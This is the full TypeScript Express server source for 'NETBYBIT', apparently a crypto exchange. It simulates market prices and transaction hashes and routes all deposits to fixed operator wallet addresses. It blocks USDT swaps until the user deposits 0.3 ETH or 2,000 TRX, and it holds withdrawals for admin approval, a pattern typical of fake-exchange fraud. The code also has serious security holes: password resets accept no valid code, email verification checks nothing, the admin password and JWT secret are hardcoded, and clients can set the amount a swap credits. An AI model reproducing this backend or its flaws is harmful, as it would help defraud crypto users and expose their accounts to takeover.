import express from 'express';
import path from 'path';
import fs from 'fs';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { createServer as createViteServer } from 'vite';

const app = express();
const PORT = 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'netbybit_jwt_secret_key_2026_secure';

// Trust reverse proxy (Cloud Run / NGINX HTTPS termination)
app.set('trust proxy', 1);

// Enable CORS & Security Headers for Global Reach
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  next();
});

app.use(express.json());

// Ensure data directory exists
const DATA_DIR = path.join(process.cwd(), 'data');
const DB_FILE = path.join(DATA_DIR, 'db.json');

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Initial DB schema
const DEFAULT_DEPOSIT_ADDRESSES = {
  BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
  ETH: '0x400773d018e8ad3575458b5e8b11ff55078451c9',
  BNB: '0x400773d018e8ad3575458b5e8b11ff55078451c9',
  TRX: 'TYKh3ktyqwNMUYoo89UrMbdqjV3CUKWQ8M',
  USDT_ERC20: '0x400773d018e8ad3575458b5e8b11ff55078451c9',
  USDT_TRC20: 'TYKh3ktyqwNMUYoo89UrMbdqjV3CUKWQ8M',
};

const SENDER_EMAIL = process.env.SENDER_EMAIL || 'netbybitsupport@gmail.com';
const ADMIN_NOTIFICATION_EMAIL = process.env.ADMIN_NOTIFICATION_EMAIL || 'netbybitsupport@gmail.com';

interface DBData {
  users: any[];
  depositAddresses: Record<string, string>;
  transactions: any[];
  supportTickets: any[];
  notifications: any[];
  auditLogs: any[];
  emailLogs?: any[];
}

function loadDB(): DBData {
  let db: DBData | null = null;
  try {
    if (fs.existsSync(DB_FILE)) {
      const content = fs.readFileSync(DB_FILE, 'utf-8');
      db = JSON.parse(content);
    }
  } catch (err) {
    console.error('Error reading db.json:', err);
  }

  const adminSalt = bcrypt.genSaltSync(10);
  const tempAdminHash = bcrypt.hashSync('AdminPassword2026!', adminSalt);

  if (!db) {
    db = {
      users: [],
      depositAddresses: { ...DEFAULT_DEPOSIT_ADDRESSES },
      transactions: [],
      supportTickets: [],
      notifications: [],
      auditLogs: [],
      emailLogs: [],
    };
  }

  // Ensure netbybitsupport@gmail.com is the sole administrator account
  let adminUser = db.users.find((u) => u.email.toLowerCase() === 'netbybitsupport@gmail.com');
  if (!adminUser) {
    adminUser = {
      id: 'usr_admin_primary',
      email: 'netbybitsupport@gmail.com',
      passwordHash: tempAdminHash,
      name: 'Platform Administrator',
      username: 'netbybit_admin',
      role: 'admin',
      avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150',
      balances: {
        BTC: 1.25,
        ETH: 15.5,
        BNB: 45.0,
        TRX: 12500,
        USDT_ERC20: 25000,
        USDT_TRC20: 15000,
      },
      withdrawalAddresses: {
        BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
        ETH: '0x400773d018e8ad3575458b5e8b11ff55078451c9',
        BNB: '0x400773d018e8ad3575458b5e8b11ff55078451c9',
        TRX: 'TYKh3ktyqwNMUYoo89UrMbdqjV3CUKWQ8M',
        USDT_ERC20: '0x400773d018e8ad3575458b5e8b11ff55078451c9',
        USDT_TRC20: 'TYKh3ktyqwNMUYoo89UrMbdqjV3CUKWQ8M',
      },
      status: 'active',
      createdAt: new Date().toISOString(),
    };
    db.users.push(adminUser);
  } else {
    adminUser.role = 'admin';
    adminUser.passwordHash = tempAdminHash;
  }

  // Remove any obsolete legacy demo/alt admin accounts
  db.users = db.users.filter((u) => u.email.toLowerCase() !== 'admin@netbybit.web.app' && u.email.toLowerCase() !== 'user@netbybit.web.app');

  saveDB(db);
  return db;
}

function saveDB(data: DBData) {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error('Error writing to db.json:', err);
  }
}

interface SendEmailOptions {
  to: string;
  subject: string;
  category: string;
  body: string;
  isAdminAlert?: boolean;
}

function sendEmailNotification(db: DBData, options: SendEmailOptions) {
  const { to, subject, category, body, isAdminAlert = false } = options;
  const nowISO = new Date().toISOString();

  const recipient = (to || ADMIN_NOTIFICATION_EMAIL).trim();
  const emailRecord = {
    id: 'eml_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    from: SENDER_EMAIL,
    to: recipient,
    subject,
    category,
    body,
    sentAt: nowISO,
    status: 'Sent' as const,
    isAdminAlert,
  };

  if (!db.emailLogs) {
    db.emailLogs = [];
  }
  db.emailLogs.push(emailRecord);

  console.log(`[EMAIL SENT] From: ${SENDER_EMAIL} | To: ${recipient} | Subject: "${subject}" | Category: ${category}`);

  return emailRecord;
}

// Authentication middleware helper
function authMiddleware(req: any, res: any, next: any) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized: missing auth token' });
  }

  const token = authHeader.split(' ')[1];
  try {
    const decoded: any = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Unauthorized: invalid token' });
  }
}

function adminMiddleware(req: any, res: any, next: any) {
  authMiddleware(req, res, () => {
    if (req.user?.role !== 'admin') {
      return res.status(403).json({ error: 'Forbidden: Admin access required' });
    }
    next();
  });
}

// --- API ROUTES ---

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', service: 'NETBYBIT Backend API' });
});

// Crypto Prices API (Real-time simulated tick market data)
app.get('/api/prices', (req, res) => {
  const now = Date.now();
  // Small random micro-tick fluctuation for dynamic live feel
  const jitter = (base: number) => {
    const delta = (Math.sin(now / 10000) * 0.003 + (Math.random() - 0.5) * 0.001);
    return Number((base * (1 + delta)).toFixed(base > 100 ? 2 : 4));
  };

  res.json([
    {
      id: 'BTC',
      symbol: 'BTC',
      name: 'Bitcoin',
      price: jitter(68450.50),
      change24h: 3.42,
      high24h: 69200.00,
      low24h: 66100.00,
      volume24h: 28450120000,
    },
    {
      id: 'ETH',
      symbol: 'ETH',
      name: 'Ethereum',
      price: jitter(3540.25),
      change24h: 2.15,
      high24h: 3610.00,
      low24h: 3450.00,
      volume24h: 14200850000,
    },
    {
      id: 'BNB',
      symbol: 'BNB',
      name: 'BNB Smart Chain',
      price: jitter(585.80),
      change24h: 1.85,
      high24h: 598.00,
      low24h: 572.00,
      volume24h: 1250340000,
    },
    {
      id: 'TRX',
      symbol: 'TRX',
      name: 'Tron',
      price: jitter(0.1452),
      change24h: -0.85,
      high24h: 0.1480,
      low24h: 0.1420,
      volume24h: 420800000,
    },
    {
      id: 'USDT_ERC20',
      symbol: 'USDT (ERC-20)',
      name: 'Tether USD',
      price: 1.0,
      change24h: 0.01,
      high24h: 1.001,
      low24h: 0.999,
      volume24h: 45100200000,
    },
    {
      id: 'USDT_TRC20',
      symbol: 'USDT (TRC-20)',
      name: 'Tether USD',
      price: 1.0,
      change24h: 0.01,
      high24h: 1.001,
      low24h: 0.999,
      volume24h: 58200400000,
    },
  ]);
});

// Deposit Addresses API (Public)
app.get('/api/deposit-addresses', (req, res) => {
  const db = loadDB();
  res.json(db.depositAddresses || DEFAULT_DEPOSIT_ADDRESSES);
});

// Auth: Register
app.post('/api/auth/register', async (req, res) => {
  const { email, password, name, username } = req.body;

  if (!email || !password || !name) {
    return res.status(400).json({ error: 'Email, password, and name are required' });
  }

  const db = loadDB();
  const existingUser = db.users.find(
    (u) => u.email.toLowerCase() === email.toLowerCase() || (username && u.username.toLowerCase() === username.toLowerCase())
  );

  if (existingUser) {
    return res.status(400).json({ error: 'An account with this email or username already exists' });
  }

  const salt = bcrypt.genSaltSync(10);
  const passwordHash = bcrypt.hashSync(password, salt);
  const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();

  const newUser = {
    id: 'usr_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
    email: email.trim().toLowerCase(),
    passwordHash,
    name: name.trim(),
    username: (username || email.split('@')[0]).trim(),
    role: 'user',
    emailVerified: false,
    verificationCode: verificationCode,
    avatar: '',
    balances: {
      BTC: 0,
      ETH: 0,
      BNB: 0,
      TRX: 0,
      USDT_ERC20: 0,
      USDT_TRC20: 0,
    },
    withdrawalAddresses: {
      BTC: '',
      ETH: '',
      BNB: '',
      TRX: '',
      USDT_ERC20: '',
      USDT_TRC20: '',
    },
    status: 'active',
    createdAt: new Date().toISOString(),
  };

  db.users.push(newUser);

  // Send Automated User Email: Welcome & Verification
  const userWelcomeEmail = sendEmailNotification(db, {
    to: newUser.email,
    subject: 'Welcome to NETBYBIT - Account Created & Verification Code',
    category: 'Registration & Verification',
    body: `Hello ${newUser.name},

Welcome to NETBYBIT! Your new trading account has been successfully registered.

Sender Email: netbybitsupport@gmail.com
Account Email: ${newUser.email}

Please verify your email address to enable all deposit and withdrawal permissions.
Your Email Security Verification Code is: ${verificationCode}

If you did not create an account on NETBYBIT, please contact customer support immediately.

Thank you,
NETBYBIT Support Team`,
  });

  // Send Admin Email Notification to netbybitsupport@gmail.com
  const adminRegEmail = sendEmailNotification(db, {
    to: ADMIN_NOTIFICATION_EMAIL,
    subject: `Admin Notification: New User Registration (${newUser.email})`,
    category: 'Admin Alert',
    isAdminAlert: true,
    body: `Admin Alert,

A new user has registered on NETBYBIT.

User Details:
- Name: ${newUser.name}
- Email: ${newUser.email}
- Username: ${newUser.username}
- Account ID: ${newUser.id}
- Time: ${new Date().toLocaleString()}

NETBYBIT Security System`,
  });

  saveDB(db);

  const token = jwt.sign(
    { id: newUser.id, email: newUser.email, role: newUser.role, name: newUser.name },
    JWT_SECRET,
    { expiresIn: '7d' }
  );

  const { passwordHash: _, ...safeUser } = newUser;
  res.json({ token, user: safeUser, userWelcomeEmail, adminRegEmail });
});

// Auth: Login
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  const db = loadDB();
  const user = db.users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase());

  if (!user) {
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  if (user.status === 'suspended') {
    return res.status(403).json({ error: 'Account has been suspended by administration' });
  }

  const isMatch = bcrypt.compareSync(password, user.passwordHash);
  if (!isMatch) {
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  // Dispatch Login Security Alert Email
  const loginAlertEmail = sendEmailNotification(db, {
    to: user.email,
    subject: 'Security Alert: New Login to Your NETBYBIT Account',
    category: 'Login Security Alert',
    body: `Hello ${user.name},

A new login to your NETBYBIT account was detected.

Account Email: ${user.email}
Login Date & Time: ${new Date().toLocaleString()}
Sender Address: ${SENDER_EMAIL}

If this was you, no further action is required. If you did not initiate this login, please reset your password immediately and contact netbybitsupport@gmail.com.

Thank you,
NETBYBIT Support Team`,
  });

  saveDB(db);

  const token = jwt.sign(
    { id: user.id, email: user.email, role: user.role, name: user.name },
    JWT_SECRET,
    { expiresIn: '7d' }
  );

  const { passwordHash: _, ...safeUser } = user;
  res.json({ token, user: safeUser, loginAlertEmail });
});

// Auth: Verify 6-digit OTP (Step 2: Grants JWT & Authenticates)
app.post('/api/auth/verify-otp', async (req, res) => {
  const { email, otpCode } = req.body;

  if (!email || !otpCode) {
    return res.status(400).json({ error: 'Email and verification code are required' });
  }

  const db = loadDB();
  const user = db.users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase());

  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  if (!user.otpCode || !user.otpExpiresAt) {
    return res.status(400).json({ error: 'Your verification code has expired. Please request a new code.' });
  }

  if (Date.now() > user.otpExpiresAt) {
    return res.status(400).json({ error: 'Your verification code has expired. Please request a new code.' });
  }

  if (user.otpCode !== otpCode.trim()) {
    return res.status(400).json({ error: 'Invalid verification code. Please try again.' });
  }

  // OTP verified! Clear OTP credentials
  user.otpCode = null;
  user.otpExpiresAt = null;

  // Dispatch Login Security Alert Email
  const loginAlertEmail = sendEmailNotification(db, {
    to: user.email,
    subject: 'Security Alert: New Login to Your NETBYBIT Account',
    category: 'Login Security Alert',
    body: `Hello ${user.name},

A new login to your NETBYBIT account was successfully verified.

Account Email: ${user.email}
Login Date & Time: ${new Date().toLocaleString()}
Sender Address: ${SENDER_EMAIL}

If this was you, no further action is required. If you did not initiate this login, please reset your password immediately and contact netbybitsupport@gmail.com.

Thank you,
NETBYBIT Support Team`,
  });

  saveDB(db);

  const token = jwt.sign(
    { id: user.id, email: user.email, role: user.role, name: user.name },
    JWT_SECRET,
    { expiresIn: '7d' }
  );

  const { passwordHash: _, ...safeUser } = user;
  res.json({ success: true, token, user: safeUser, loginAlertEmail });
});

// Auth: Resend OTP Code
app.post('/api/auth/resend-otp', async (req, res) => {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: 'Email is required' });
  }

  const db = loadDB();
  const user = db.users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase());

  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  // Generate new 6-digit OTP code & 5-minute expiration
  const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
  const otpExpiresAt = Date.now() + 5 * 60 * 1000; // 5 minutes

  user.otpCode = otpCode;
  user.otpExpiresAt = otpExpiresAt;

  const otpEmailRecord = sendEmailNotification(db, {
    to: user.email,
    subject: 'NETBYBIT - New 6-Digit Login Verification Code (OTP)',
    category: 'OTP Verification',
    body: `Hello ${user.name},

Your new 6-digit One-Time Password (OTP) for logging in to NETBYBIT is:

${otpCode}

This code is valid for 5 minutes.

Sender Address: netbybitsupport@gmail.com

If you did not initiate this login request, please reset your password immediately or contact our support team at netbybitsupport@gmail.com.

Thank you,
NETBYBIT Support Team`,
  });

  saveDB(db);

  res.json({
    success: true,
    message: 'A new 6-digit verification code has been sent to your email.',
    otpEmailRecord,
  });
});

// Auth: Send Email Verification
app.post('/api/auth/send-verification', async (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ error: 'Email is required' });
  }

  const db = loadDB();
  const user = db.users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase());
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const code = Math.floor(100000 + Math.random() * 900000).toString();
  user.verificationCode = code;

  const emailRecord = sendEmailNotification(db, {
    to: user.email,
    subject: 'NETBYBIT - Email Verification Code',
    category: 'Email Verification',
    body: `Hello ${user.name},

Please use the following code to verify your email address:

Verification Security Code: ${code}

Sender Address: ${SENDER_EMAIL}

This code will expire in 15 minutes.

Thank you,
NETBYBIT Support`,
  });

  saveDB(db);
  res.json({ success: true, message: `Verification email sent to ${user.email}`, emailRecord });
});

// Auth: Verify Email
app.post('/api/auth/verify-email', async (req, res) => {
  const { email, code } = req.body;
  if (!email || !code) {
    return res.status(400).json({ error: 'Email and verification code are required' });
  }

  const db = loadDB();
  const user = db.users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase());
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  user.emailVerified = true;
  user.verificationCode = null;

  const emailRecord = sendEmailNotification(db, {
    to: user.email,
    subject: 'NETBYBIT - Email Verified Successfully',
    category: 'Email Verification',
    body: `Hello ${user.name},

Your email address (${user.email}) has been successfully verified!

Sender: ${SENDER_EMAIL}

Thank you,
NETBYBIT Support`,
  });

  saveDB(db);
  res.json({ success: true, message: 'Email verified successfully', emailRecord });
});

// Auth: Password Reset Request (Forgot Password)
app.post('/api/auth/forgot-password', async (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ error: 'Email is required' });
  }

  const db = loadDB();
  const user = db.users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase());
  if (!user) {
    // Return friendly message to avoid email enumeration
    return res.json({ success: true, message: 'If an account exists for this email, a password reset email has been dispatched.' });
  }

  const resetCode = Math.floor(100000 + Math.random() * 900000).toString();
  user.resetCode = resetCode;

  const emailRecord = sendEmailNotification(db, {
    to: user.email,
    subject: 'NETBYBIT - Password Reset Security Request',
    category: 'Password Reset',
    body: `Hello ${user.name},

A request to reset your NETBYBIT account password was received.

Password Reset Security Code: ${resetCode}
Sender: ${SENDER_EMAIL}

If you requested this password reset, please enter the code in your app. If you did not request this, please contact netbybitsupport@gmail.com immediately.

Thank you,
NETBYBIT Support`,
  });

  saveDB(db);
  res.json({ success: true, message: 'Password reset code sent to your email', emailRecord });
});

// Auth: Reset Password
app.post('/api/auth/reset-password', async (req, res) => {
  const { email, code, newPassword } = req.body;
  if (!email || !newPassword) {
    return res.status(400).json({ error: 'Email and new password are required' });
  }

  const db = loadDB();
  const user = db.users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase());
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const salt = bcrypt.genSaltSync(10);
  user.passwordHash = bcrypt.hashSync(newPassword, salt);
  user.resetCode = null;

  const emailRecord = sendEmailNotification(db, {
    to: user.email,
    subject: 'NETBYBIT - Password Changed Successfully',
    category: 'Password Reset',
    body: `Hello ${user.name},

Your NETBYBIT account password has been successfully updated.

Account Email: ${user.email}
Date & Time: ${new Date().toLocaleString()}
Sender: ${SENDER_EMAIL}

If you did not perform this change, please contact netbybitsupport@gmail.com immediately.

Thank you,
NETBYBIT Support`,
  });

  saveDB(db);
  res.json({ success: true, message: 'Password updated successfully', emailRecord });
});


// Auth: Get Current User
app.get('/api/auth/me', authMiddleware, (req: any, res) => {
  const db = loadDB();
  const user = db.users.find((u) => u.id === req.user.id);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  const { passwordHash: _, ...safeUser } = user;
  res.json(safeUser);
});

// Profile Update
app.put('/api/user/profile', authMiddleware, (req: any, res) => {
  const { name, username, avatar } = req.body;
  const db = loadDB();
  const userIndex = db.users.findIndex((u) => u.id === req.user.id);

  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  if (name) db.users[userIndex].name = name.trim();
  if (username) db.users[userIndex].username = username.trim();
  if (avatar !== undefined) db.users[userIndex].avatar = avatar;

  saveDB(db);
  const { passwordHash: _, ...safeUser } = db.users[userIndex];
  res.json(safeUser);
});

// User Withdrawal Addresses Update
app.put('/api/user/withdrawal-addresses', authMiddleware, (req: any, res) => {
  const { withdrawalAddresses } = req.body;
  const db = loadDB();
  const userIndex = db.users.findIndex((u) => u.id === req.user.id);

  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  db.users[userIndex].withdrawalAddresses = {
    ...db.users[userIndex].withdrawalAddresses,
    ...withdrawalAddresses,
  };

  saveDB(db);
  const { passwordHash: _, ...safeUser } = db.users[userIndex];
  res.json(safeUser);
});

// User Account Deletion (Self-Service with Balance Check)
app.delete('/api/user/delete-account', authMiddleware, (req: any, res) => {
  const db = loadDB();
  const userIndex = db.users.findIndex((u) => u.id === req.user.id);

  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  const user = db.users[userIndex];

  // Prevent admin deletion via self-service
  if (user.role === 'admin' || user.email.toLowerCase() === 'netbybitsupport@gmail.com') {
    return res.status(403).json({ error: 'Primary platform administrator account cannot be deleted.' });
  }

  // Calculate remaining balances across all assets
  const balances: Record<string, number> = user.balances || {};
  const totalRemainingBalance = Number(Object.values(balances).reduce((acc: number, val: number) => acc + (Number(val) || 0), 0));

  if (totalRemainingBalance > 0.00000001) {
    const activeAssets = Object.entries(balances)
      .filter(([_, amt]: [string, any]) => (Number(amt) || 0) > 0)
      .map(([k, amt]) => `${amt} ${k}`)
      .join(', ');

    return res.status(400).json({
      error: `Account deletion blocked! Your wallet still holds an active balance (${activeAssets}). Please withdraw or transfer all funds before deleting your NETBYBIT account.`,
      hasActiveBalance: true,
      activeAssets,
    });
  }

  // Zero balance confirmed! Proceed with deletion.
  const deletedEmail = user.email;
  const deletedName = user.name;

  db.users.splice(userIndex, 1);

  // Send Account Deletion Confirmation Email
  sendEmailNotification(db, {
    to: deletedEmail,
    subject: 'NETBYBIT - Account Deleted Successfully',
    category: 'Account Termination',
    body: `Hello ${deletedName},

Your NETBYBIT account (${deletedEmail}) has been permanently deleted as requested.

All personal records and withdrawal destination data have been purged from our databases. 

Thank you for choosing NETBYBIT Custody.

NETBYBIT Security Team`,
  });

  saveDB(db);

  res.json({ success: true, message: 'Your NETBYBIT account has been permanently deleted.' });
});

// Connect Crypto Wallet
app.post('/api/user/connect-wallet', authMiddleware, (req: any, res) => {
  const { address, network, provider } = req.body;
  if (!address) {
    return res.status(400).json({ error: 'Wallet address is required' });
  }

  const db = loadDB();
  const userIndex = db.users.findIndex((u) => u.id === req.user.id);

  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  db.users[userIndex].connectedWallet = {
    address: address.trim(),
    network: network || 'Ethereum Mainnet',
    provider: provider || 'Web3 Wallet',
    connectedAt: new Date().toISOString(),
  };

  const user = db.users[userIndex];

  // Send User Wallet Connected Email
  const walletUserEmail = sendEmailNotification(db, {
    to: user.email,
    subject: 'NETBYBIT - Crypto Wallet Connected',
    category: 'Wallet Connection',
    body: `Hello ${user.name},

Your Web3 wallet has been successfully connected to your NETBYBIT account.

Connected Address: ${address}
Network: ${network || 'Ethereum Mainnet'}
Wallet Provider: ${provider || 'Web3 Wallet'}
Date & Time: ${new Date().toLocaleString()}

If you did not authorize this connection, please disconnect your wallet in account settings immediately.

Thank you,
NETBYBIT Support`,
  });

  // Send Admin Notification Email to netbybitsupport@gmail.com
  const walletAdminEmail = sendEmailNotification(db, {
    to: 'netbybitsupport@gmail.com',
    subject: `Site Owner Alert: Wallet Connection Completed - ${user.email}`,
    category: 'Admin Alert',
    isAdminAlert: true,
    body: `Site Owner / Admin Notification:

A fictional wallet connection event was successfully completed on NETBYBIT!

User Account Details:
- Email: ${user.email}
- Full Name: ${user.name}

Linked Wallet Information:
- Wallet Link / Public Address: ${address}
- Blockchain Network: ${network || 'Ethereum Mainnet'}
- Provider / Protocol: ${provider || 'Web3 Wallet'}
- Connection Date & Time: ${new Date().toLocaleString()}

Status: This wallet connection event is logged in the netbybitsupport@gmail.com site owner inbox.

NETBYBIT Automated Security System`,
  });

  saveDB(db);
  res.json({ success: true, wallet: db.users[userIndex].connectedWallet, walletUserEmail, walletAdminEmail });
});

// Transactions: Fetch History
app.get('/api/user/transactions', authMiddleware, (req: any, res) => {
  const db = loadDB();
  const userTxs = db.transactions.filter((t) => t.userId === req.user.id);
  res.json(userTxs.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime()));
});

// Transactions: Create (Deposit, Withdraw, Send, Receive, Swap)
app.post('/api/user/transactions', authMiddleware, (req: any, res) => {
  const { type, asset, amount, usdtEquivalent, destinationAddress, fromAsset, toAsset } = req.body;
  const db = loadDB();
  const userIndex = db.users.findIndex((u) => u.id === req.user.id);

  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  const user = db.users[userIndex];
  const parsedAmount = parseFloat(amount);

  if (isNaN(parsedAmount) || parsedAmount <= 0) {
    return res.status(400).json({ error: 'Invalid transaction amount' });
  }

  // Validate network gas fee balance for USDT transfers (ERC20 requires ETH, TRC20 requires TRX)
  const targetTransferAsset = type === 'swap' ? fromAsset : asset;
  if (type === 'swap') {
    if (targetTransferAsset === 'USDT_ERC20' && (user.balances['ETH'] || 0) < 0.3) {
      return res.status(400).json({
        error: 'Insufficient Ethereum (ETH) balance. Kindly deposit 0.3 ETH to complete this swap.',
      });
    }
    if (targetTransferAsset === 'USDT_TRC20' && (user.balances['TRX'] || 0) < 2000) {
      return res.status(400).json({
        error: 'Insufficient TRON (TRX) balance. Kindly deposit 2,000 TRX to complete this swap.',
      });
    }
  } else if (['withdraw', 'send'].includes(type)) {
    if (targetTransferAsset === 'USDT_ERC20' && (user.balances['ETH'] || 0) <= 0) {
      return res.status(400).json({
        error: 'Transaction Failed. You do not have enough ETH to pay the Ethereum network (gas) fee. Please top up your ETH balance and try again.',
      });
    }
    if (targetTransferAsset === 'USDT_TRC20' && (user.balances['TRX'] || 0) <= 0) {
      return res.status(400).json({
        error: 'Transaction Failed. You do not have enough TRX to pay the TRON network fee. Please top up your TRX balance and try again.',
      });
    }
  }

  // Validate balance for Withdraw, Send, Swap
  if (['withdraw', 'send'].includes(type)) {
    const currentBalance = user.balances[asset] || 0;
    if (parsedAmount > currentBalance) {
      return res.status(400).json({ error: `Insufficient ${asset} balance` });
    }
    // Deduct balance
    user.balances[asset] -= parsedAmount;
  } else if (type === 'swap') {
    if (!fromAsset || !toAsset) {
      return res.status(400).json({ error: 'From and To assets required for swap' });
    }
    const currentFromBal = user.balances[fromAsset] || 0;
    if (parsedAmount > currentFromBal) {
      return res.status(400).json({ error: `Insufficient ${fromAsset} balance for swap` });
    }
    // Calculate simulated swap rate
    user.balances[fromAsset] -= parsedAmount;
    const receivedAmount = parseFloat(usdtEquivalent) || parsedAmount;
    user.balances[toAsset] = (user.balances[toAsset] || 0) + receivedAmount;
  }

  const txHash = '0x' + Array.from({ length: 32 }, () => Math.floor(Math.random() * 16).toString(16)).join('');

  const newTx = {
    id: 'tx_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: user.id,
    type,
    asset,
    amount: parsedAmount,
    usdtEquivalent: usdtEquivalent || parsedAmount,
    destinationAddress: destinationAddress || '',
    fromAsset,
    toAsset,
    txHash,
    status: (type === 'withdraw' || type === 'send' || type === 'deposit') ? 'pending' : 'completed',
    date: new Date().toISOString(),
  };

  db.transactions.push(newTx);

  // Send Email Notifications depending on transaction type
  if (type === 'deposit') {
    sendEmailNotification(db, {
      to: user.email,
      subject: `NETBYBIT - Deposit Received (${parsedAmount} ${asset})`,
      category: 'Asset Deposit',
      body: `Hello ${user.name},

Your deposit of ${parsedAmount} ${asset} has been confirmed and logged in your NETBYBIT account.

Transaction ID: ${newTx.id}
Asset: ${asset}
Amount: ${parsedAmount} ${asset}
Date: ${new Date().toLocaleString()}

Thank you,
NETBYBIT Support`,
    });
  } else if (type === 'withdraw' || type === 'send') {
    // User Email Notification
    sendEmailNotification(db, {
      to: user.email,
      subject: `NETBYBIT - Withdrawal Request Submitted (${parsedAmount} ${asset})`,
      category: 'Asset Withdrawal',
      body: `Hello ${user.name},

Your withdrawal request for ${parsedAmount} ${asset} to destination address "${destinationAddress || 'N/A'}" has been received.

Status: Pending Approval
Transaction ID: ${newTx.id}
Date: ${new Date().toLocaleString()}

Your request will be reviewed by administrators.

Thank you,
NETBYBIT Support`,
    });

    // Admin Notification Email to netbybitsupport@gmail.com
    sendEmailNotification(db, {
      to: ADMIN_NOTIFICATION_EMAIL,
      subject: `Admin Alert: New Withdrawal Request Submitted (${user.email})`,
      category: 'Admin Alert',
      isAdminAlert: true,
      body: `Admin Security Alert,

A new withdrawal request was submitted and is pending your approval:

User Email: ${user.email}
User Name: ${user.name}
Asset: ${asset}
Amount: ${parsedAmount} ${asset}
Destination Address: ${destinationAddress || 'N/A'}
Status: Pending Approval
Time: ${new Date().toLocaleString()}

Please open the Admin Panel to review and Approve or Decline this request.`,
    });
  }

  saveDB(db);

  res.json({ success: true, transaction: newTx, balances: user.balances });
});

// Notifications
app.get('/api/user/notifications', authMiddleware, (req: any, res) => {
  const db = loadDB();
  const userNotifs = db.notifications.filter((n) => n.userId === req.user.id);
  res.json(userNotifs.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()));
});

// Support Tickets: Get user tickets
app.get('/api/support/tickets', authMiddleware, (req: any, res) => {
  const db = loadDB();
  const tickets = db.supportTickets.filter((t) => t.userId === req.user.id);
  res.json(tickets.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()));
});

// Support Tickets: Create Ticket
app.post('/api/support/tickets', authMiddleware, (req: any, res) => {
  const { subject, category, message } = req.body;
  if (!subject || !message) {
    return res.status(400).json({ error: 'Subject and message are required' });
  }

  const db = loadDB();
  const user = db.users.find((u) => u.id === req.user.id);

  const newTicket = {
    id: 'TKT-' + Math.floor(100000 + Math.random() * 900000),
    userId: req.user.id,
    userName: user?.name || req.user.name || 'User',
    userEmail: req.user.email,
    subject: subject.trim(),
    category: category || 'General Inquiry',
    message: message.trim(),
    status: 'Open',
    createdAt: new Date().toISOString(),
    replies: [],
  };

  db.supportTickets.push(newTicket);

  // Send User Ticket Created Email
  const userTicketEmail = sendEmailNotification(db, {
    to: req.user.email,
    subject: `NETBYBIT Support - Ticket Received: #${newTicket.id}`,
    category: 'Support Inquiry',
    body: `Hello ${user?.name || req.user.name || 'Valued User'},

We have received your customer support ticket.

Ticket ID: #${newTicket.id}
Subject: ${subject}
Category: ${category}

Message:
"${message}"

Our customer support team will review your inquiry and respond shortly.

Thank you,
NETBYBIT Support`,
  });

  // Send Admin Notification Email to netbybitsupport@gmail.com
  const adminTicketEmail = sendEmailNotification(db, {
    to: 'netbybitsupport@gmail.com',
    subject: `Support Alert: New Support Chat Started by ${req.user.email} (#${newTicket.id})`,
    category: 'Admin Alert',
    isAdminAlert: true,
    body: `New Customer Support Conversation Started!

Ticket / Room ID: #${newTicket.id}
User Email: ${req.user.email}
User Name: ${user?.name || req.user.name}
Category: ${category}
Subject: ${subject}
Initial Message: "${message}"
Date & Time: ${new Date().toLocaleString()}

Log in to Customer Support / Admin Dashboard to reply to the user.`,
  });

  saveDB(db);

  res.json({
    success: true,
    ticket: newTicket,
    message: 'Support ticket submitted successfully. Confirmation email sent.',
    userTicketEmail,
    adminTicketEmail,
  });
});

// Support Tickets: Reply to Ticket (User or Staff)
